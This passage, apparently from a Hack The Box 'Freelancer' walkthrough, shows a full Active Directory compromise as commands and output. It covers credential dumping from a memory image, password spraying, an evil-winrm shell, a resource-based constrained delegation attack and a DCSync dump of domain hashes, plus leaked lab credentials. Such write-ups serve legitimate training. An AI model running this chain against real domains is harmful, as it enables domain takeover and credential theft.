</span></span></span></code></pre></div><p>And once it has been transferred, delete the connection:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\mikasaAckerman\Desktop&gt;net use /d \\10.10.16.9\smb2Folder
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>net use /d \\10.10.16.9\smb2Folder
</span></span></span><span class=line><span class=cl><span class=go>\\10.10.16.9\smb2Folder was deleted successfully.
</span></span></span></code></pre></div><p>Now, in our machine just extract the <code>7z</code> file running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ 7z x MEMORY.7z
</span></span></span></code></pre></div><p>Where we have now a <code>MEMORY.DMP</code> file. To extract data from this <code>.dmp</code> file such as hive files, I will use <code>MemProcFS</code> (which can be downloaded from <a href=https://github.com/ufrisk/MemProcFS/releases/tag/v5.10 class=external-link target=_blank rel=noopener>its Github repository</a>). Once downloaded, I extract all the data inside <code>.dmp</code> file and import it inside a folder called <code>tmp_mount</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ mkdir tmp_mount
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ./memprocfs -device MEMORY.DMP -mount ./tmp_mount
</span></span></span><span class=line><span class=cl><span class=go>Initialized 64-bit Windows 10.0.17763
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>==============================  MemProcFS  ==============================
</span></span></span><span class=line><span class=cl><span class=go> - Author:           Ulf Frisk - pcileech@frizk.net
</span></span></span><span class=line><span class=cl><span class=go> - Info:             https://github.com/ufrisk/MemProcFS
</span></span></span><span class=line><span class=cl><span class=go> - Discord:          https://discord.gg/pcileech
</span></span></span><span class=line><span class=cl><span class=go> - License:          GNU Affero General Public License v3.0
</span></span></span><span class=line><span class=cl><span class=go>   ---------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go>   MemProcFS is free open source software. If you find it useful please
</span></span></span><span class=line><span class=cl><span class=go>   become a sponsor at: https://github.com/sponsors/ufrisk Thank You :)
</span></span></span><span class=line><span class=cl><span class=go>   ---------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go> - Version:          5.10.0 (Linux)
</span></span></span><span class=line><span class=cl><span class=go> - Mount Point:      ./tmp_mount
</span></span></span><span class=line><span class=cl><span class=go> - Tag:              17763_a3431de6
</span></span></span><span class=line><span class=cl><span class=go> - Operating System: Windows 10.0.17763 (X64)
</span></span></span><span class=line><span class=cl><span class=go>==========================================================================
</span></span></span></code></pre></div><p>After the files has been extracted (and <em>without</em> closing <code>MemProcFS</code> window/terminal), I go to <code>./tmp_mnount/registry/hive_files</code> and I can see the files that are interesting for me: <code>SYSTEM</code>, <code>SAM</code> and <code>SECURITY</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cd ./tmp_mount/registry/hive_files
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 0
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x        0 Jul 11 21:07 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x        0 Jul 11 21:07 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x     8192 Jul 11 21:07 0xffffd30679c0e000-unknown-unknown.reghive
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 18440192 Jul 11 21:07 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    28672 Jul 11 21:07 0xffffd30679cdc000-unknown-MACHINE_HARDWARE.reghive
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x     8192 Jul 11 21:07 0xffffd3067b257000-settingsdat-A_{c94cb844-4804-8507-e708-439a8873b610}.reghive
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x   323584 Jul 11 21:07 0xffffd3067b261000-ActivationStoredat-A_{23F7AFEB-1A41-4BD7-9168-EA663F1D9A7D}.reghive
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    28672 Jul 11 21:07 0xffffd3067b514000-BCD-MACHINE_BCD00000000.reghive
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 90902528 Jul 11 21:07 0xffffd3067b516000-SOFTWARE-MACHINE_SOFTWARE.reghive
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x   319488 Jul 11 21:07 0xffffd3067d7e9000-DEFAULT-USER_.DEFAULT.reghive
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    49152 Jul 11 21:07 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    49152 Jul 11 21:07 0xffffd3067d935000-SAM-MACHINE_SAM.reghive
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Then, I use <code>secretsdump.py</code> from <code>Impacket</code> to extract credentials/hashes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive local
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Target system bootKey: 0xaeb5f8f068bbe8789b87bf985e129382
</span></span></span><span class=line><span class=cl><span class=go>[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
</span></span></span><span class=line><span class=cl><span class=go>Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::
</span></span></span><span class=line><span class=cl><span class=go>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></span><span class=line><span class=cl><span class=go>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></span><span class=line><span class=cl><span class=go>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::
</span></span></span><span class=line><span class=cl><span class=go>[*] Dumping cached domain logon information (domain/username:hash)
</span></span></span><span class=line><span class=cl><span class=go>FREELANCER.HTB/Administrator:$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361: (2023-10-04 12:55:34)
</span></span></span><span class=line><span class=cl><span class=go>FREELANCER.HTB/lorra199:$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1: (2023-10-04 12:29:00)
</span></span></span><span class=line><span class=cl><span class=go>FREELANCER.HTB/liza.kazanof:$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679: (2023-10-04 17:31:23)
</span></span></span><span class=line><span class=cl><span class=go>[*] Dumping LSA Secrets
</span></span></span><span class=line><span class=cl><span class=go>[*] $MACHINE.ACC
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span>MACHINE.ACC:plain_password_hex:a680a4af30e045066419c6f52c073d738241fa9d1cff591b951535cff5320b109e65220c1c9e4fa891c9d1ee22e990c4766b3eb63fb3e2da67ebd19830d45c0ba4e6e6df93180c0a7449750655edd78eb848f757689a6889f3f8f7f6cf53e1196a528a7cd105a2eccefb2a17ae5aebf84902e3266bbc5db6e371627bb0828c2a364cb01119cf3d2c70d920328c814cad07f2b516143d86d0e88ef1504067815ed70e9ccb861f57394d94ba9f77198e9d76ecadf8cdb1afda48b81f81d84ac62530389cb64d412b784f0f733551a62ec0862ac2fb261b43d79990d4e2bfbf4d7d4eeb90ccd7dc9b482028c2143c5a6010
</span></span><span class=line><span class=cl><span class=gp>$</span>MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1003ddfa0a470017188b719e1eaae709
</span></span><span class=line><span class=cl><span class=go>[*] DPAPI_SYSTEM
</span></span></span><span class=line><span class=cl><span class=go>dpapi_machinekey:0xcf1bc407d272ade7e781f17f6f3a3fc2b82d16bc
</span></span></span><span class=line><span class=cl><span class=go>dpapi_userkey:0x6d210ab98889fac8829a1526a5d6a2f76f8f9d53
</span></span></span><span class=line><span class=cl><span class=go>[*] NL$KM
</span></span></span><span class=line><span class=cl><span class=go> 0000   63 4D 9D 4C 85 EF 33 FF  A5 E1 4D E2 DC A1 20 75   cM.L..3...M... u
</span></span></span><span class=line><span class=cl><span class=go> 0010   D2 20 EA A9 BC E0 DB 7D  BE 77 E9 BE 6E AD 47 EC   . .....}.w..n.G.
</span></span></span><span class=line><span class=cl><span class=go> 0020   26 02 E1 F6 BF F5 C5 CC  F9 D6 7A 16 49 1C 43 C5   &amp;.........z.I.C.
</span></span></span><span class=line><span class=cl><span class=go> 0030   77 6D E0 A8 C6 24 15 36  BF 27 49 96 19 B9 63 20   wm...$.6.&#39;I...c
</span></span></span><span class=line><span class=cl><span class=go>NL$KM:634d9d4c85ef33ffa5e14de2dca12075d220eaa9bce0db7dbe77e9be6ead47ec2602e1f6bff5c5ccf9d67a16491c43c5776de0a8c6241536bf27499619b96320
</span></span></span><span class=line><span class=cl><span class=go>[*] _SC_MSSQL$DATA
</span></span></span><span class=line><span class=cl><span class=go>(Unknown User):PWN3D#l0rr@Armessa199
</span></span></span><span class=line><span class=cl><span class=go>[*] Cleaning up...
</span></span></span></code></pre></div><p>I save the hashes, but none of them work. For example:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.5 -u &#39;Administrator&#39; -H &#39;725180474a181356e53f4fe3dffac527&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\Administrator:725180474a181356e53f4fe3dffac527 STATUS_LOGON_FAILURE
</span></span></span></code></pre></div><p>However, at the bottom I can see a password: <code>PWN3D#l0rr@Armessa199</code>. If I use, again, <code>NetExec</code> with our list of potential users and this password we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.5 -u users.txt -p &#39;PWN3D#l0rr@Armessa199&#39; --continue-on-success
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\Administrator:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\leon.sk:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\lkazanof:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\maya.artmes:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\michael.williams:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\wwalker:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
</span></span></span></code></pre></div><p>So we have valid credentials: <code>lorra199:PWN3D#l0rr@Armessa199</code></p><p>I remember that this user was part of <code>Remote Management Users</code> group, so we should be able to connect with this user via <code>WinRM</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec winrm 10.10.11.5 -u &#39;lorra199&#39; -p &#39;PWN3D#l0rr@Armessa199&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WINRM       10.10.11.5      5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:freelancer.htb)
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.5      5985   DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 (Pwn3d!)
</span></span></span></code></pre></div><p>so we connect via <code>WinRM</code> using <code>evil-winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ evil-winrm -u &#39;lorra199&#39; -p &#39;PWN3D#l0rr@Armessa199&#39; -i 10.10.11.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Evil-WinRM shell v3.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Establishing connection to remote endpoint
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\lorra199\Documents&gt; whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>freelancer\lorra199
</span></span></span></code></pre></div><p>Checking groups of this user I can see:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\lorra199\Documents&gt; net user lorra199
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User name                    lorra199
</span></span></span><span class=line><span class=cl><span class=go>Full Name
</span></span></span><span class=line><span class=cl><span class=go>Comment                      IT Support Technician
</span></span></span><span class=line><span class=cl><span class=go>User&#39;s comment
</span></span></span><span class=line><span class=cl><span class=go>Country/region code          000 (System Default)
</span></span></span><span class=line><span class=cl><span class=go>Account active               Yes
</span></span></span><span class=line><span class=cl><span class=go>Account expires              Never
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password last set            10/4/2023 8:19:13 AM
</span></span></span><span class=line><span class=cl><span class=go>Password expires             Never
</span></span></span><span class=line><span class=cl><span class=go>Password changeable          10/5/2023 8:19:13 AM
</span></span></span><span class=line><span class=cl><span class=go>Password required            Yes
</span></span></span><span class=line><span class=cl><span class=go>User may change password     Yes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Workstations allowed         All
</span></span></span><span class=line><span class=cl><span class=go>Logon script
</span></span></span><span class=line><span class=cl><span class=go>User profile
</span></span></span><span class=line><span class=cl><span class=go>Home directory
</span></span></span><span class=line><span class=cl><span class=go>Last logon                   5/13/2024 11:12:56 AM
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Logon hours allowed          All
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Local Group Memberships      *Remote Management Use
</span></span></span><span class=line><span class=cl><span class=go>Global Group memberships     *Domain Users         *AD Recycle Bin
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><p>To check the <code>AD</code> environment privileges, I will use <code>Bloodhound</code>. For this I first use <code>bloodhound-python</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ bloodhound-python -u lorra199 -p &#34;PWN3D#l0rr@Armessa199&#34; -d freelancer.htb -ns 10.10.11.5 -c all
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>INFO: Found AD domain: freelancer.htb
</span></span></span><span class=line><span class=cl><span class=go>INFO: Getting TGT for user
</span></span></span><span class=line><span class=cl><span class=go>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.freelancer.htb:88)] [Errno -2] Name or service not known
</span></span></span><span class=line><span class=cl><span class=go>INFO: Connecting to LDAP server: dc.freelancer.htb
</span></span></span><span class=line><span class=cl><span class=go>INFO: Found 1 domains
</span></span></span><span class=line><span class=cl><span class=go>INFO: Found 1 domains in the forest
</span></span></span><span class=line><span class=cl><span class=go>INFO: Found 8 computers
</span></span></span><span class=line><span class=cl><span class=go>INFO: Connecting to LDAP server: dc.freelancer.htb
</span></span></span><span class=line><span class=cl><span class=go>INFO: Found 30 users
</span></span></span><span class=line><span class=cl><span class=go>INFO: Found 58 groups
</span></span></span><span class=line><span class=cl><span class=go>INFO: Found 2 gpos
</span></span></span><span class=line><span class=cl><span class=go>INFO: Found 1 ous
</span></span></span><span class=line><span class=cl><span class=go>INFO: Found 19 containers
</span></span></span><span class=line><span class=cl><span class=go>INFO: Found 0 trusts
</span></span></span><span class=line><span class=cl><span class=go>INFO: Starting computer enumeration with 10 workers
</span></span></span><span class=line><span class=cl><span class=go>INFO: Querying computer: SetupMachine.freelancer.htb
</span></span></span><span class=line><span class=cl><span class=go>INFO: Querying computer:
</span></span></span><span class=line><span class=cl><span class=go>INFO: Querying computer:
</span></span></span><span class=line><span class=cl><span class=go>INFO: Querying computer:
</span></span></span><span class=line><span class=cl><span class=go>INFO: Querying computer:
</span></span></span><span class=line><span class=cl><span class=go>INFO: Querying computer: Datacenter-2019
</span></span></span><span class=line><span class=cl><span class=go>INFO: Querying computer:
</span></span></span><span class=line><span class=cl><span class=go>INFO: Querying computer: DC.freelancer.htb
</span></span></span><span class=line><span class=cl><span class=go>WARNING: Could not resolve: Datacenter-2019: All nameservers failed to answer the query Datacenter-2019. IN A: Server Do53:10.10.11.5@53 answered SERVFAIL
</span></span></span><span class=line><span class=cl><span class=go>INFO: Done in 00M 35S
</span></span></span></code></pre></div><p>Then, on <code>Bloodhound</code> I check <code>lorra199</code> user:</p><p><img alt="Freelancer 21" src=/pentesting/images/Freelancer_21.png></p><p>As we have seen previously, is a member of <code>AD Recycle Bin</code> group. Now, looking at <code>AD Recycle Bin</code> group:</p><p><img alt="Freelancer 22" src=/pentesting/images/Freelancer_22.png></p><p>shows that we could perform a <code>Resource-based Constrained Delegation</code> (<code>RBCD</code>) attack. This means that we are able to add a fake computer to the domain and, then, request the <code>Kerberos</code> ticket of any user (like <code>Administrator</code>) to the <code>DC</code> under this fake computer.</p><p>We add a fake computer using <code>addcomputer.py</code> from <code>Impacket</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -computer-name &#39;ATTACKERSYSTEM$&#39; -computer-pass &#39;gunzf0x123$!&#39; -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:&#39;PWN3D#l0rr@Armessa199&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Successfully added machine account ATTACKERSYSTEM$ with password gunzf0x123$!.
</span></span></span></code></pre></div><p>And then we need to delegate rights using <code>rbcd.py</code> from <code>Impacket</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /usr/share/doc/python3-impacket/examples/rbcd.py -delegate-from &#39;ATTACKERSYSTEM$&#39; -delegate-to &#39;DC$&#39; -dc-ip 10.10.11.5 -action &#39;write&#39; &#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
</span></span></span><span class=line><span class=cl><span class=go>[*] Delegation rights modified successfully!
</span></span></span><span class=line><span class=cl><span class=go>[*] ATTACKERSYSTEM$ can now impersonate users on DC$ via S4U2Proxy
</span></span></span><span class=line><span class=cl><span class=go>[*] Accounts allowed to act on behalf of other identity:
</span></span></span><span class=line><span class=cl><span class=go>[*]     ATTACKERSYSTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
</span></span></span></code></pre></div><p>Now we can attempt to request the tickets. For this we use <code>getST.py</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /usr/share/doc/python3-impacket/examples/getST.py -spn &#39;cifs/DC.freelancer.htb&#39; -impersonate Administrator -dc-ip 10.10.11.5 &#39;freelancer.htb/ATTACKERSYSTEM$:gunzf0x123$!&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] CCache file is not found. Skipping...
</span></span></span><span class=line><span class=cl><span class=go>[*] Getting TGT for user
</span></span></span><span class=line><span class=cl><span class=go>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
</span></span></span></code></pre></div><p>But I get the time error. When this happens we can try to run to synchronize clocks:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo ntpdate -s 10.10.11.5
</span></span></span></code></pre></div><p>and then re-run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /usr/share/doc/python3-impacket/examples/getST.py -spn &#39;cifs/DC.freelancer.htb&#39; -impersonate Administrator -dc-ip 10.10.11.5 &#39;freelancer.htb/ATTACKERSYSTEM$:gunzf0x123$!&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] CCache file is not found. Skipping...
</span></span></span><span class=line><span class=cl><span class=go>[*] Getting TGT for user
</span></span></span><span class=line><span class=cl><span class=go>[*] Impersonating Administrator
</span></span></span><span class=line><span class=cl><span class=go>[*] Requesting S4U2self
</span></span></span><span class=line><span class=cl><span class=go>[*] Requesting S4U2Proxy
</span></span></span><span class=line><span class=cl><span class=go>[*] Saving ticket in Administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache
</span></span></span></code></pre></div><p>And, finally, use <code>secretsdump.py</code> and the <code>Kerberos</code> ticket to get the hashes for all users in the domain:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ export KRB5CCNAME=/home/gunzf0x/HTB/HTBMachines/Hard/Freelancer/content/Administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache &amp;&amp; python3 /usr/share/doc/python3-impacket/examples/secretsdump.py &#39;freelancer.htb/Administrator@DC.freelancer.htb&#39; -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntlm
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span></span></span><span class=line><span class=cl><span class=go>[*] Using the DRSUAPI method to get NTDS.DIT secrets
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
</span></span></span><span class=line><span class=cl><span class=go>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></span><span class=line><span class=cl><span class=go>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d238e0bfa17d575038efc070187a91c2:::
</span></span></span><span class=line><span class=cl><span class=go>freelancer.htb\mikasaAckerman:1105:aad3b435b51404eeaad3b435b51404ee:e8d62c7d57e5d74267ab6feb2f662674:::
</span></span></span><span class=line><span class=cl><span class=go>sshd:1108:aad3b435b51404eeaad3b435b51404ee:c1e83616271e8e17d69391bdcd335ab4:::
</span></span></span><span class=line><span class=cl><span class=go>SQLBackupOperator:1112:aad3b435b51404eeaad3b435b51404ee:c4b746db703d1af5575b5c3d69f57bab:::
</span></span></span><span class=line><span class=cl><span class=go>sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
</span></span></span><span class=line><span class=cl><span class=go>lorra199:1116:aad3b435b51404eeaad3b435b51404ee:67d4ae78a155aab3d4aa602da518c051:::
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>WS2-WIN11$:1157:aad3b435b51404eeaad3b435b51404ee:bf5267ee6236c86a3596f72f2ddef2da:::
</span></span></span><span class=line><span class=cl><span class=go>WS3-WIN11$:1158:aad3b435b51404eeaad3b435b51404ee:732c190482eea7b5e6777d898e352225:::
</span></span></span><span class=line><span class=cl><span class=go>DC2$:1159:aad3b435b51404eeaad3b435b51404ee:e1018953ffa39b3818212aba3f736c0f:::
</span></span></span><span class=line><span class=cl><span class=go>SETUPMACHINE$:8601:aad3b435b51404eeaad3b435b51404ee:f5912663ecf2c8cbda2a4218127d11fe:::
</span></span></span><span class=line><span class=cl><span class=go>ATTACKERSYSTEM$:12101:aad3b435b51404eeaad3b435b51404ee:ef266c6b963c0bb683941032008ad47f:::
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Cleaning up...
</span></span></span></code></pre></div><p>I check if these hashes work for <code>Administrator</code> user with <code>NetExec</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec winrm 10.10.11.5 -u Administrator -H &#39;0039318f1e8274633445bce32ad1a290&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WINRM       10.10.11.5      5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:freelancer.htb)
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.5      5985   DC               [+] freelancer.htb\Administrator:0039318f1e8274633445bce32ad1a290 (Pwn3d!)
